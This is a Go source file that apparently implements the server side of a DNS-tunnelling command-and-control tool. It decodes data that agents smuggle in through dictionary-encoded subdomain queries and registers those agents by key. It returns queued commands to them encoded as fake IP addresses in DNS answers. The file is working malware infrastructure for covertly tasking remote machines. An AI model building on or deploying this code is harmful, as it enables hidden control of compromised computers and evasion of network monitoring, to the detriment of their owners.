package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
)

var (
	tmp = map[string]string{}
)

type server struct {
	clients map[string]client
	port    int
}

func bytesToIP(b []byte) string {
	return fmt.Sprintf("%d.%d.%d.%d", b[0], b[1], b[2], b[3])
}

func pad(tobepadded string) string {
	// pad to 4 bytes
	for len(tobepadded)%4 != 0 {
		tobepadded += " "
	}
	return tobepadded
}

func ipencode(str string) []string {
	str = pad(str)
	// split str into chunks of 4 bytes
	chunks := make([][]byte, len(str)/4)
	for i := 0; i < len(str)/4; i++ {
		chunks[i] = []byte(str[i*4 : i*4+4])
	}

	// convert each chunk to an IP
	ips := make([]string, len(chunks))
	for i, chunk := range chunks {
		ips[i] = bytesToIP(chunk)
	}

	return ips
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	return strings.Join(chars, "")
}

func mnemonicdecode(dict map[string]string, str string) string {
	// find the key for the value str
	for key, value := range dict {
		if value == str {
			return key
		}
	}

	return ""
}

func getdict() map[string]string {
	file, err := os.Open("agent/dictionary.txt")
	if err != nil {
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	dict := map[string]string{}
	for scanner.Scan() {
		line := scanner.Text()
		key := strings.Split(line, ":")[0]
		value := strings.Split(line, ":")[1]
		dict[key] = value
	}

	return dict
}

func incoming(query string, ip string) []string {
	query = strings.Split(query, ".")[0]
	ip = strings.Split(ip, ":")[0]
	switch query {
	case "ping":
		return ipencode("fingerprint")
	default:
		// fmt.Println(query[:3])
		if query[:3] == "cmd" {
			id := strings.Split(query, "_")[1]
			cmd := serv.clients[id].queue[0]
			return ipencode(cmd)
		}
		if mnemonicdecode(getdict(), query) == "don" {
			parsed := strings.Split(tmp[ip], "mynuts")
			// base64 decode
			bin, _ := base64.StdEncoding.DecodeString(parsed[0])
			dat := string(bin)

			if len(dat) == 32 {
				serv.clients[parsed[1]] = client{dat, []string{}, ip}
			}
			tmp[ip] = ""
			return ipencode("received don")
		} else {
			tmp[ip] += mnemonicdecode(getdict(), query)
			return ipencode("added")
		}
	}
}

func Serve(port int) server {
	serv = server{make(map[string]client), port}

	// Start the DNS server
	go DNS(port, serv)

	return serv
}
